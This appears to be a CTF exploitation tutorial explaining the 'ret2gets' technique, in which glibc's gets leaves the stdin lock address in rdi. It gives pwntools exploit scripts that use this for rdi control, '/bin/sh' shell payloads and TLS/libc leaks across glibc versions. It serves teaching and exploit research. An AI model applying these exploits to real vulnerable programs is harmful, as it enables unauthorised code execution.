# ret2gets

Ah the `gets` function, a staple of insecure coding and overflow challenges, reading as much data as possible upto a `\n`. While most people are interested in its unlimited overflow, I'm interested in its applications for `rdi` control, and even libc leaks. What am I talking about you may be asking?

Well, let's go back to the demo program.

```c
// gcc demo.c -o demo -no-pie -fno-stack-protector
#include <stdio.h>

int main() {
	char buf[0x20];
	puts("ROP me if you can!");
	gets(buf);
}
```

Running this under `gdb`, let's enter any string, and see what happens to the registers after `gets`, because as you probably know, many functions will clobber the argument variables as they have no need to preserve them, and will use them either as scratch registers, or in other function calls (or both!). For `gets`, all we'd need is some writable address to land in `rdi`, then perhaps we could do something?

<figure><img src="https://281452579-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FO4GaVx6h6D06xlxKSULj%2Fuploads%2FzxQIzji31CVpJs3ejtSW%2Fimage.png?alt=media&#x26;token=d495e7cd-3332-47cc-9f70-da0855ed59d5" alt=""><figcaption><p>gdb after entering "aaaa"</p></figcaption></figure>

<figure><img src="https://281452579-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FO4GaVx6h6D06xlxKSULj%2Fuploads%2FaNFhNyclNM0DrVAAZdzS%2Fimage.png?alt=media&#x26;token=7265bced-58d2-42e9-bd13-98fac0c5e1fb" alt=""><figcaption><p><code>_IO_stdfile_0_lock</code> in memory</p></figcaption></figure>

Bingo! We have a address which appears to exist in libc's **writable** region, so by calling `gets` again in our rop chain, we could overwrite libc data, perhaps smash some useful structures. However, without a libc leak that could be limited. There could be multiple ways to utilise this, but the one I'm most interested in here is smashing `_IO_stdfile_0_lock`.

## `_IO_stdfile_0_lock`

Let's not beat around the bush, glibc's IO is complicated, so much so that there's a whole category related to IO exploitation, called `FSOP`. That won't be the focus here, instead we're looking at what's generally overlooked when it comes to glibc IO: **locking**.

Because glibc supports multithreading, many glibc functions need to be thread-safe, which means that they're resistant to data racing. This is a problem faced by glibc IO, because multiple threads can use the same `FILE` structures at the same time, so if 2 threads try to use one at the same time, this is called a race condition, and it can break the `FILE`. We fix this using locks.

If you've ever looked at glibc source code for IO functions (as you do), you may noticed a common pattern with a lot of them (except printf and scanf, as they're more complicated, more on those later). Let's take [gets](https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/iogets.c#L31) (2.35 for now):

```c
char *
_IO_gets (char *buf)
{
  size_t count;
  int ch;
  char *retval;

  _IO_acquire_lock (stdin);
  ch = _IO_getc_unlocked (stdin);
  if (ch == EOF)
    {
      retval = NULL;
      goto unlock_return;
    }
  if (ch == '\n')
    count = 0;
  else
    {
      /* This is very tricky since a file descriptor may be in the
	 non-blocking mode. The error flag doesn't mean much in this
	 case. We return an error only when there is a new error. */
      int old_error = stdin->_flags & _IO_ERR_SEEN;
      stdin->_flags &= ~_IO_ERR_SEEN;
      buf[0] = (char) ch;
      count = _IO_getline (stdin, buf + 1, INT_MAX, '\n', 0) + 1;
      if (stdin->_flags & _IO_ERR_SEEN)
	{
	  retval = NULL;
	  goto unlock_return;
	}
      else
	stdin->_flags |= old_error;
    }
  buf[count] = 0;
  retval = buf;
unlock_return:
  _IO_release_lock (stdin);
  return retval;
}
```

At the start of the function it uses `_IO_acquire_lock`, and at the end it uses `_IO_release_lock`. The idea is that *acquiring* the lock tells other threads that `stdin` is currently in use, and any other threads that try to access `stdin` will be forced to wait until this thread *releases* the lock, telling other threads that `stdin` is no longer in use.

For this reason, `FILE` has a field [\_lock](https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/bits/types/struct_FILE.h#L81), which is a pointer to a [\_IO\_lock\_t](https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/nptl/stdio-lock.h#L26) (stored at offset `+0x88`):

```c
typedef struct {
    int lock;
    int cnt;
    void *owner;
} _IO_lock_t;
```

### Sidenote on finding locking functions

I had some trouble finding the necessary macros and functions for acquiring and releasing locks, so I'll make a note here. I use [elixir bootlin](https://elixir.bootlin.com/glibc/glibc-2.35/source) for reading and searching the glibc code base. When [searching](https://elixir.bootlin.com/glibc/glibc-2.35/C/ident/_IO_acquire_lock) for `_IO_acquire_lock`, we get multiple definitions, which isn't very helpful (same thing for `_IO_release_lock`).

&#x20;![](https://281452579-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FO4GaVx6h6D06xlxKSULj%2Fuploads%2FKC2HP250znhs58f4mczv%2Fimage.png?alt=media\&token=cbdcbf17-83bc-4f36-9ce4-16170b452d6e)

So which one gets used?

* `sysdeps/htl`: This is the `Hurd version`, which would be used on [GNU Hurd](https://www.gnu.org/software/hurd/). This isn't nearly as common as `GNU Linux`, so we can ignore this one.
* `sysdeps/generic`: Like the name suggests, this is designed to work anywhere which doesn't have a specific definition, like a fallback. This isn't used in our case.
* `libio/libioP.h`: Seems to be [another fallback](https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/libioP.h#L887), in a specific case at least, when `_IO_MTSAFE_IO` isn't defined. If these were used, no locking is done at all, so this implies this is when we don't care about thread safety.\
  In our case `_IO_MTSAFE_IO` is set, so we can ignore this.

The correct one is `sysdeps/nptl`, otherwise known as `Native POSIX Threads Library`.

### `_IO_acquire_lock`/`_IO_release_lock`

These macros are [defined](https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/nptl/stdio-lock.h#L88) as follows:

```c
#  define _IO_acquire_lock(_fp) \
  do {									      \
    FILE *_IO_acquire_lock_file						      \
	__attribute__((cleanup (_IO_acquire_lock_fct)))			      \
	= (_fp);							      \
    _IO_flockfile (_IO_acquire_lock_file);
# else
#  ...
# endif
# define _IO_release_lock(_fp) ; } while (0)
```

This may look confusing, but the 2 important functions to take away from this are `_IO_flockfile` and `_IO_acquire_lock_fct`. The `__attribute__((cleanup))` maybe look bizarre, but all it does is call `_IO_acquire_lock_fct` on `_fp` when the end of the artificial `do-while(0)` block is over (basically at the end of the IO function). [\_IO\_acquire\_lock\_fct](https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/libioP.h#L880) is defined as:

```c
static inline void
__attribute__ ((__always_inline__))
_IO_acquire_lock_fct (FILE **p)
{
  FILE *fp = *p;
  if ((fp->_flags & _IO_USER_LOCK) == 0)
    _IO_funlockfile (fp);
}
```

So really from this, the 2 macros for locking and unlocking are [\_IO\_flockfile](https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/libio.h#L282) and [\_IO\_funlockfile](https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/libio.h#L284).

```c
# define _IO_flockfile(_fp) \
  if (((_fp)->_flags & _IO_USER_LOCK) == 0) _IO_lock_lock (*(_fp)->_lock)
# define _IO_funlockfile(_fp) \
  if (((_fp)->_flags & _IO_USER_LOCK) == 0) _IO_lock_unlock (*(_fp)->_lock)
```

`_IO_USER_LOCK=0x8000` is a macro which seems to indicate whether or not the inbuilt locking should be used or not. This is usually used internally, like in helper streams in `printf` for example. For our purposes we can ignore this, as this check will always pass for `stdin` (or any of the standard streams for that matter). Finally we get to the macros that we care about: `_IO_lock_lock` and `_IO_lock_unlock`.

### `_IO_lock_lock`/`_IO_lock_unlock`

[\_IO\_lock\_lock](https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/nptl/stdio-lock.h#L37) and [\_IO\_lock\_unlock](https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/nptl/stdio-lock.h#L67) are defined as:

```c
#define _IO_lock_lock(_name) \
  do {									      \
    void *__self = THREAD_SELF;						      \
    if ((_name).owner != __self)					      \
      {									      \
	lll_lock ((_name).lock, LLL_PRIVATE);				      \
        (_name).owner = __self;						      \
      }									      \
    ++(_name).cnt;							      \
  } while (0)

#define _IO_lock_unlock(_name) \
  do {									      \
    if (--(_name).cnt == 0)						      \
      {									      \
        (_name).owner = NULL;						      \
	lll_unlock ((_name).lock, LLL_PRIVATE);				      \
      }									      \
  } while (0)
```

Note that `_name` is the lock itself, and in the case of `gets`, is `_IO_stdfile_0_lock`.

Let's break this down. The `owner` field stores the address of `TLS` (Thread Local Storage) structure for the thread currently using the lock (if you're wondering what the `TLS` structure is, it's the structure whose address is stored in the `fs` register; it also stores the canary, and you've likely seen `fs:[0x28]` in disassembly). So when locking, if the `owner` is different to `THREAD_SELF` (i.e. lock is owned by a different thread), it waits until that thread has *unlocked* using `lll_lock`, then claims ownership of the lock. When unlocking, it removes its ownership, and signals that it's no longer in use with `lll_unlock`.

The use of `cnt` is a bit bizarre to me. The only way I could see this being useful is if the same thread had to use the lock multiple times, perhaps due to recursive(?) calls. Perhaps it's just a flexibility thing, I'm not sure. But what I can tell you is that this will be useful for us in a moment ;)

### `_IO_stdfile_0_lock` in `rdi`?

You may be wondering why this happens, and while this is slightly bizarre, I can give an educated guess.

For one thing, `_IO_lock_unlock` is what's called at the very end of most IO functions, including `gets`, so its effects on the registers are the most recent before returning, with nothing afterwards clobbering the registers.

<figure><img src="https://281452579-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FO4GaVx6h6D06xlxKSULj%2Fuploads%2FbcroEgcMEsVAdtdN9lKD%2Fimage.png?alt=media&#x26;token=805512df-71ce-4e5f-8b96-2d759a737bae" alt=""><figcaption><p><code>gets+131</code></p></figcaption></figure>

<figure><img src="https://281452579-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FO4GaVx6h6D06xlxKSULj%2Fuploads%2FVVzzUVZEd705XBhGNWOn%2Fimage.png?alt=media&#x26;token=86165360-228f-4e94-aa62-b0567510e18b" alt=""><figcaption><p><code>_IO_lock_unlock</code></p></figcaption></figure>

Above is the disassembly of `_IO_lock_unlock`. `rbp` stores the address of `stdin`, so `+182` is checking `_IO_USER_LOCK`. But then look at `+191`. Recall that `_lock` is stored at an offset of `+0x88`, so this must be loading `stdin._lock`, which as we know is `_IO_stdfile_0_lock`, and we see that it's loading into `rdi`! Then pretty soon afterwards it returns, without clobbering `rdi` (`__lll_lock_wait_private` doesn't clobber it either, it's just a thin wrapper around the `futex` syscall).

<figure><img src="https://281452579-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FO4GaVx6h6D06xlxKSULj%2Fuploads%2F9vsF8k2hLRhp546tnrxa%2Fimage.png?alt=media&#x26;token=d398b8ce-e41c-482e-a569-9b65254e5b2c" alt=""><figcaption><p><code>__lll_lock_wait_private</code></p></figcaption></figure>

So that's where `_IO_stdfile_0_lock` comes from, but ~~where did it go?~~ *why* does `_lock` get loaded into `rdi`?

That's a good question, to which my best guess would be that it's an optimization made by the compiler. In the case where `lll_unlock` is called, the address of `_lock` is passed directly to the `futex` wrapper as the one and only argument (i.e. through the `rdi` register). Therefore it loads `_lock` into `rdi` so that it doesn't need to use an extra assignment to prepare the call to `futex` like `mov rdi, [register containing _lock]`, which saves space and time.

### glibc prior to `2.30`

While we're mainly looking at `2.34+`, let's have a brief look at versions prior to that. It appears that prior to `2.30`, the disassembly looks a bit different. For example, the following is from `2.29`.

<figure><img src="https://281452579-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FO4GaVx6h6D06xlxKSULj%2Fuploads%2FeQyADCk30EMc0Wsq017g%2Fimage.png?alt=media&#x26;token=28b29f88-f2e0-4993-9aad-d87546576587" alt=""><figcaption><p>2.29 <code>_IO_lock_unlock</code></p></figcaption></figure>

Instead of loading it into `rdi`, it loads it into `rdx`, then later into `rdi` just for the `futex` call? And what's going on around the call to `__lll_unlock_wake_private` with `rsp`? This seems like a bizarre choice for the compiler to make, and the reason for that is that this part is [written in assembly](https://elixir.bootlin.com/glibc/glibc-2.29/source/sysdeps/unix/sysv/linux/x86_64/lowlevellock.h#L195). I couldn't tell you why, but what I can say is that this causes problems for us, as `_lock` only gets loaded into `rdi` under very specific cirumstances, which hinders our potential techniques.

### Detecting this behaviour

For fun, I decided to write a [python script](https://gist.github.com/sasha-999/1dcc54e932e59975da82b14691febc38) which uses `angr` that can detect this behaviour automatically, for a given libc.

The libc doesn't require debug symbols, and the script should work for `2.23-2.39`, as these were the versions I tested (`2.39` is the most recent version as of writing this).

## Exploit techniques

Now for the fun stuff. I'm gonna show you a few simple techniques which can help you with your ropping, one for controlling `rdi` and another for leaking libc.

I'll demonstrate these using the demo program, which is patched to run using glibc 2.35 (that'll be important later).

{% file src="<https://281452579-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FO4GaVx6h6D06xlxKSULj%2Fuploads%2FJir9BOGhAhgmx54SVVgO%2Fdemo.zip?alt=media&token=99507b10-612d-486d-8118-6033c21f8049>" %}

### Controlling `rdi`

One idea you may have already had is that, since `_IO_stdfile_0_lock` always ends up in `rdi` after a call to `gets`, and `gets` allows us to write arbitrary data to a pointer in `rdi`, then surely we can just write `/bin/sh` to `_IO_stdfile_lock`, right?

If you were thinking that, then good job, because you're correct, we can!

Since `rdi -> _IO_stdfile_0_lock`, another call to `gets` will write data there. Then we'd send `/bin/sh`, and then that 2nd call to `gets` will return `_IO_stdfile_0_lock -> "/bin/sh"` in `rdi`. This would get around needing to use `pop rdi ; ret` to get a pointer to `/bin/sh`, so if you had `system` available, then you could get a shell!

One important thing to note is that after we overwrite the lock, `_IO_lock_unlock` will be executed before we return. This will decrement `cnt`, and if the new `cnt` is `0`, then `lll_unlock` will clobber our data! This is why it's important to overwrite `cnt` to a value other than `1`, and we have to adjust that value to be `+1` more than what we want. The code for this would be as follows:

```python
from pwn import *

e = context.binary = ELF('demo')
p = e.process()

payload  = b"A" * 0x20
payload += p64(0)	# saved rbp
payload += p64(e.plt.gets)

p.sendlineafter(b"ROP me if you can!\n", payload)

gdb.attach(p)
p.sendline(b"/bin" + p8(u8(b"/")+1) + b"sh")

p.interactive()
```

<figure><img src="https://281452579-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FO4GaVx6h6D06xlxKSULj%2Fuploads%2FYgNjR5GiRO83DKtb4e6B%2Fimage.png?alt=media&#x26;token=68398aab-7b30-4090-b9f3-a3f1d4f9cfbb" alt=""><figcaption><p><code>rdi</code> control!</p></figcaption></figure>

While this will of course `SEGFAULT`, we see our desired result of `rdi -> "/bin/sh"`!

Another thing to note is that `/bin/sh` will remain in `_IO_stdfile_0_lock` until we change it back, so after any subequent calls to `gets`, we'll get back this pointer to `/bin/sh`. Because even though the locking will increment the `cnt`, it will leave the rest of the contents alone, then unlocking will decrement it back.

{% hint style="info" %}
This relies on being able to skip over `lll_unlock` by having a large value for `cnt`.

But for `2.29` and prior, it only loads `_lock` into `rdi` when calling `lll_unlock`, so this won't work as `rdi` won't end up pointing to `_IO_stdfile_0_lock -> "/bin/sh"`.
{% endhint %}

{% hint style="info" %}
I also found out that I'm not the first person to discover this, [w3th4nds](https://app.hackthebox.com/users/70668) beat me to it with the challenge [Sound of Silence](https://github.com/hackthebox/cyber-apocalypse-2024/tree/main/pwn/\[Medium]%20Sound%20of%20Silence), and I wouldn't be surprised if it's been found/used before then, I just hadn't seen it before writing this.
{% endhint %}

### Leaking libc

There are a few ways you can leak libc using `gets`.

#### printf

For one, if you have access to `printf`, then you can just use the trick above to enter a format string and then call `printf`.

```python
p.sendline(b"%69$" + p8(u8(b"p")+1))
```

Another benefit of this is we can leak more than just libc: as long as it's on the stack, after our ROP chain, it's leakable!

#### puts

But what if you don't have `printf`, and instead have only `puts`? Well fear not, because we have another trick up our sleeves: `_lock.owner`.

Recall the `_IO_lock_t` structure:

```c
typedef struct {
    int lock;
    int cnt;
    void *owner;
} _IO_lock_t;
```

And also recall that `owner` gets assigned the address of the `TLS` structure for this thread. While it isn't immediately at the start of the lock, it's not far out of our reach, so what if we were able to pad upto to it, then call `puts`. Since `TLS` (at least for the main thread) is allocated relative to libc, all you'd need is the offset from `TLS` to libc base.

{% hint style="warning" %}
Unfortunately this leak can cause problems depending on the kernel(?), because the TLS can be in different places on different machines, and it doesn't seem to be fixable by using the same docker.

So keep that in mind when transferring the exploit to remote.

While I suspect this is due to a kernel difference, if anyone knows exactly why, I'd love to hear it, and I could include it here as well.
{% endhint %}

There are initially a few problems with this:

* All input using `gets` is terminated by a null byte
* `owner` gets `NULL`'ed when unlocking if `--cnt==0` (i.e. `cnt==1`)

But both of these can be solved with one input:

```python
p.sendline(b"A" * 4 + b"\x00"*3)
```

The main idea behind this is that we want to set `cnt=0`, so that when it comes to unlocking, it will decrement count **first**, then check it against `0`, which fails because now `cnt=0xffffffff`, due to an integer underflow. What this does is eliminate the terminating null byte from `gets`, but also since the check fails, `owner` doesn't get `NULL`'ed, meaning we have uninterrupted padding upto `owner=TLS`, meaning we can then call `puts` and leak `TLS`.

```python
from pwn import *

e = context.binary = ELF('demo')
libc = ELF("libc")
p = e.process()

payload  = b"A" * 0x20
payload += p64(0)	# saved rbp
payload += p64(e.plt.gets)
payload += p64(e.plt.puts)

p.sendlineafter(b"ROP me if you can!\n", payload)

p.sendline(b"A" * 4 + b"\x00"*3)

p.recv(8)
tls = u64(p.recv(6) + b"\x00\x00")
log.info(f"tls: {hex(tls)}")

libc.address = tls + 0x28c0
log.info(f"libc: {hex(libc.address)}")

p.interactive()
```

### Adjusting for 2.37+

The above was tested on 2.35, and should work for 2.30-2.36, but 2.37 changed [\_IO\_lock\_lock](https://elixir.bootlin.com/glibc/glibc-2.37/source/sysdeps/nptl/stdio-lock.h#L37) and [\_IO\_lock\_unlock](https://elixir.bootlin.com/glibc/glibc-2.37/source/sysdeps/nptl/stdio-lock.h#L70) to:

```c
#define _IO_lock_lock(_name) \
  do {									      \
    void *__self = THREAD_SELF;						      \
    if (SINGLE_THREAD_P && (_name).owner == NULL)			      \
      {									      \
	(_name).lock = LLL_LOCK_INITIALIZER_LOCKED;			      \
	(_name).owner = __self;						      \
      }									      \
    else if ((_name).owner != __self)					      \
      {									      \
	lll_lock ((_name).lock, LLL_PRIVATE);				      \
	(_name).owner = __self;						      \
      }									      \
    else								      \
      ++(_name).cnt;							      \
  } while (0)

#define _IO_lock_unlock(_name) \
  do {									      \
    if (SINGLE_THREAD_P && (_name).cnt == 0)				      \
      {									      \
	(_name).owner = NULL;						      \
	(_name).lock = 0;						      \
      }									      \
    else if ((_name).cnt == 0)						      \
      {									      \
	(_name).owner = NULL;						      \
	lll_unlock ((_name).lock, LLL_PRIVATE);				      \
      }									      \
    else								      \
      --(_name).cnt;							      \
  } while (0)
```

Bit more complicated now, but the main takeaways are:

* The inclusion of `SINGLE_THREAD_P`
* `cnt` is only decremented if `cnt != 0`

Seems now that `cnt = 0` doesn't necessarily imply that the lock isn't being used, but rather not being used by 2+ instances.

This forces us to adjust our techniques slightly, especially for leaking libc (the controlling of `rdi`, in its current state anyway hasn't been affected). This is because we can no longer cause an integer underflow to eliminate the terminating null byte, as it refuses to decrement `cnt=0`.

Fortunately there is a way around this, but it will require an extra call to `gets`.

```python
from pwn import *

e = context.binary = ELF('demo')
libc = ELF("libc")
p = e.process()

payload  = b"A" * 0x20
payload += p64(0)	# saved rbp
payload += p64(e.plt.gets)
payload += p64(e.plt.gets)
payload += p64(e.plt.puts)

p.sendlineafter(b"ROP me if you can!\n", payload)

p.sendline(p32(0) + b"A"*4 + b"B"*8)
p.sendline(b"CCCC")

p.recv(8)
tls = u64(p.recv(6) + b"\x00\x00")
log.info(f"tls: {hex(tls)}")

libc.address = tls + 0x28c0
log.info(f"libc: {hex(libc.address)}")

p.interactive()
```

So what's going on here?

The main aim of the first `gets` is to do the following:

1. Set `lock = 0`, which marks the lock as [unlocked](https://elixir.bootlin.com/glibc/glibc-2.37/source/sysdeps/nptl/lowlevellock.h#L170)*.*

   ```c
   /* Initializers for lock.  */
   #define LLL_LOCK_INITIALIZER		(0)
   #define LLL_LOCK_INITIALIZER_LOCKED	(1)
   ```
2. Fill `cnt` with junk.
3. Clobber `owner` so that `owner != THREAD_SELF`

Then on the last call to `gets`, when `_IO_lock_lock` is executed:

1. ```c
   if (SINGLE_THREAD_P && (_name).owner == NULL)
   ```

   This check will **fail**, even if the process is single-threaded, because we set `owner` to junk, so `owner != NULL`. You could do a version where this case passes if you wanted, I decided to make the technique not reliant on it being single-threaded (i.e. more versatile).
2. ```c
   else if ((_name).owner != __self)
   ```

   This check will **succeed**.
3. ```c
       lll_lock ((_name).lock, LLL_PRIVATE);
   ```

   Unforunately this is unavoidable, but since we set `lock = 0`, this lock is marked as **unlocked**, so this will just lock it (set `lock = 1`).
4. ```c
       (_name).owner = __self;
   ```

   Bingo! The `owner` gets set to the `TLS` structure, which is what we want to leak

Since `lock = 1`, it contains null bytes which would terminate `puts`, so here we need to fill `lock` with junk (`"CCCC"`). But what about the null byte from `gets`? Just like before, the `cnt` getting decremented in unlocking will help to eliminate this null byte.

`p.sendline(b"CCCC")` will write a null byte into the `LSB` of `cnt`. In `_IO_lock_unlock`, `cnt` gets decremented as `cnt != 0`, which converts the `\x00` into `\xff`, and just like before, the unlocking will leave `owner` alone.

And just like that, we now have padding upto `owner=TLS`.

This version of the leak will actually work before 2.37 as well, so this is the more versatile one.

## What if `rdi != _IO_stdfile_0_lock`?

This is all pretty cool (in my opinion at least ~~if you disagree you're wrong~~), but what if we were presented the following program:

```c
#include <stdio.h>

int main() {
	char buf[0x20];
	puts("ROP me if you can!");
	gets(buf);
	puts("No lock for you ;)");
}
```

Now we have a problem. While `gets` would place `_IO_stdfile_0_lock` into `rdi`, the subequent `puts` call would clobber it. Now what?

Ideally we'd want to find a way to put `_IO_stdfile_0_lock` into `rdi`, and fortunately there are a few tricks we can use in certain cases:

### Case 1: `rdi` is writable

Even if it isn't `_IO_stdfile_0_lock`, any writable `rdi` would be a valid condidate for a `gets` call, which would then put `_IO_stdfile_0_lock` back into `rdi`!

A common case for this is after some other IO function. Recall that most IO functions follow that locking pattern, which includes `puts`. So in the above example, `rdi` would be `_IO_stdfile_1_lock`, which we can just call `gets` on to get our beloved `_IO_stdfile_0_lock`. For dealing with another IO lock, you can use `p.sendline(b"\x01")`, as the expected value for `lock` will be `1` (`LLL_LOCK_INITIALIZER_LOCKED`).

### Case 2: `rdi` is readable

While this won't make for a valid candidate for `gets`, it would make a valid candidate for `puts`, so call to `puts` would put into `Case 1`, and so you can then apply the above.

### Case 3: `rdi == NULL`

This won't be usable in most IO functions unfortunately. But `printf` isn't just another IO function, it's built **different**. Let's take a look shall we? Don't worry, we won't go too far ;)

#### printf/scanf

Note that `scanf` follows a very similar pattern, and displays the same behaviour as printf in this regard.

[printf](https://elixir.bootlin.com/glibc/glibc-2.35/source/stdio-common/printf.c#L27) is defined as follows:

```c
int
__printf (const char *format, ...)
{
  va_list arg;
  int done;

  va_start (arg, format);
  done = __vfprintf_internal (stdout, format, arg, 0);
  va_end (arg);

  return done;
}
```

Here we see it calls `__vfprintf_internal` with the first argument (i.e. `rdi`) being `stdout`.

Then in [\_\_vfprintf\_internal](https://elixir.bootlin.com/glibc/glibc-2.35/source/stdio-common/vfprintf-internal.c#L1179) we see that early on it calls [ARGCHECK](https://elixir.bootlin.com/glibc/glibc-2.35/source/stdio-common/vfprintf-internal.c#L49)

```c
int
vfprintf (FILE *s, const CHAR_T *format, va_list ap, unsigned int mode_flags)
{
  ...

  /* Sanity check of arguments.  */
  ARGCHECK (s, format);
```

```c
#define ARGCHECK(S, Format) \
  do									      \
    {									      \
      /* Check file argument for consistence.  */			      \
      CHECK_FILE (S, -1);						      \
      if (S->_flags & _IO_NO_WRITES)					      \
	{								      \
	  S->_flags |= _IO_ERR_SEEN;					      \
	  __set_errno (EBADF);						      \
	  return -1;							      \
	}								      \
      if (Format == NULL)						      \
	{								      \
	  __set_errno (EINVAL);						      \
	  return -1;							      \
	}								      \
    } while (0)
```

The main takeaway from all of this is that `ARGCHECK` forces `printf` to return early if `format == NULL`, meaning it won't `SEGFAULT`. And since `__vfprintf_internal` was called with `stdout` as the first argument, we can guess that it should be preserved until returning. So, is it?

```c
#include <stdio.h>

int main() {
	printf(NULL);
}
```

<figure><img src="https://281452579-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FO4GaVx6h6D06xlxKSULj%2Fuploads%2FG8hLYuRtHkOkSf17UVPZ%2Fimage.png?alt=media&#x26;token=d753e7e5-5a74-4bb6-bce1-eee3ff9787c1" alt=""><figcaption><p><code>printf(NULL)</code></p></figcaption></figure>

Yes it is! So now we can just use this as a writable address.

There's also a possibility here to use an `FSOP` technique to get a leak. I won't go into detail here, but if you're interested here are some links:

* <https://0xdf.gitlab.io/2021/01/16/htb-ropetwo.html#leak-libc>
* <https://www.willsroot.io/2021/01/rope2-hackthebox-writeup-chromium-v8.html>
* <https://vigneshsrao.github.io/posts/babytcache/>

#### fflush

Normally `fflush` is called with a single `FILE` to flush its contents:

```c
printf("Data: ");    // if stdout is buffered, this may not be printed immediately
fflush(stdout);
```

However you can call `fflush(NULL)`, which will go through every `FILE` and flush all of them.

<figure><img src="https://281452579-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FO4GaVx6h6D06xlxKSULj%2Fuploads%2Fd8CPrNC2yapCq7AOrNB7%2Fimage.png?alt=media&#x26;token=f6c26fec-ce18-4145-b32a-5dd8e041dfdd" alt=""><figcaption><p><a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/iofflush.c#L31">fflush</a></p></figcaption></figure>

It does by calling [\_IO\_flush\_all](https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/genops.c#L724).

<figure><img src="https://281452579-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FO4GaVx6h6D06xlxKSULj%2Fuploads%2FVMzFFk4Iqt7pGO5u5VjX%2Fimage.png?alt=media&#x26;token=fd3b27f2-9216-45bb-9042-f791f7965133" alt=""><figcaption><p><a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/genops.c#L714">_IO_flush_all_lockp</a></p></figcaption></figure>

Then at the end of `_IO_flush_all(_lockp)`, it first unlocks `list_all_lock`, which is used to lock the list of all `FILE`'s. While this would put a lock into `rdi`, that's not what reaches the end.

It then calls `_IO_cleanup_region_end(0)`, which is effectively just:

<figure><img src="https://281452579-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FO4GaVx6h6D06xlxKSULj%2Fuploads%2Fb74fluuaJEbsxFKBtXBJ%2Fimage.png?alt=media&#x26;token=4bf07e57-9657-483e-8fbc-51134c430fc3" alt=""><figcaption><p><a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/nptl/libc-lock.h#L174">_IO_cleanup_region_end</a></p></figcaption></figure>

This then goes onto call [\_\_libc\_cleanup\_pop\_restore](https://elixir.bootlin.com/glibc/glibc-2.35/source/nptl/libc-cleanup.c#L38) with a first argument of `&_buffer`, which is preserved until returning. `_buffer` is a cleanup buffer, which is stored on the stack, so a stack pointer is returned in `rdi`! For more information, see [here](https://sashactf.gitbook.io/pwn-notes/ctf-writeups/htb-business-2024/no-gadgets#fun-with-fun-lockfile).

### Case 4: `rdi` is junk

#### rand

There's actually a non-IO function that can be used here: `rand`, which returns a pointer to `unsafe_state` in `rdi` across a broad range of libc versions. More details on this can be found [here](https://sashactf.gitbook.io/pwn-notes/fork_gadget#ret2rand).

#### getchar/putchar

In theory, these functions would be perfect. The argument wouldn't matter, and as IO functions *usually* unlock at the very end, they would place a lock into `rdi` (`getchar` would give you `_IO_stdfile_0_lock_`). Unfortunately, there's an optimization in the way: `_IO_need_lock`.

<figure><img src="https://281452579-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FO4GaVx6h6D06xlxKSULj%2Fuploads%2FNAGMNOUDcsbQilsPwgfH%2Fimage.png?alt=media&#x26;token=b543c221-4901-4109-8b57-489e177d4397" alt=""><figcaption><p><a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/getchar.c#L33">getchar</a></p></figcaption></figure>

So if the `FILE` is determined to not need a lock, then it doesn't use one?

<figure><img src="https://281452579-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FO4GaVx6h6D06xlxKSULj%2Fuploads%2FTgfEnqeJIx8V2t28RhR2%2Fimage.png?alt=media&#x26;token=09919732-6f36-4505-b955-886779e474eb" alt=""><figcaption><p><a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/libio.h#L212">_IO_need_lock</a></p></figcaption></figure>

It turns out that for some simpler IO functions, the locking can be optimized away in the single-threaded case:

<figure><img src="https://281452579-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FO4GaVx6h6D06xlxKSULj%2Fuploads%2FyUzh41B9xlazJe1CniBo%2Fimage.png?alt=media&#x26;token=8ddd6038-986d-4c40-aef1-0a5b647fb5a6" alt=""><figcaption><p>Where <code>_IO_need_lock</code> is used.</p></figcaption></figure>

And when a thread is made, [\_IO\_enable\_locks](https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/genops.c#L517) is called, which ensures all new and old `FILE`'s have the `_IO_FLAGS2_NEED_LOCK` flag set.

So, when the application is multithreaded, `getchar`/`putchar` would use locking, otherwise it would just follow the behaviour of `_IO_(getc|putc)_unlocked`.

<figure><img src="https://281452579-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FO4GaVx6h6D06xlxKSULj%2Fuploads%2FVAq3Gf1JBIKkuBK9dT82%2Fimage.png?alt=media&#x26;token=d667d55c-76b3-4d9a-9f82-75f0136f9106" alt=""><figcaption><p><a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/bits/types/struct_FILE.h#L102">_IO_getc_unlocked</a></p></figcaption></figure>

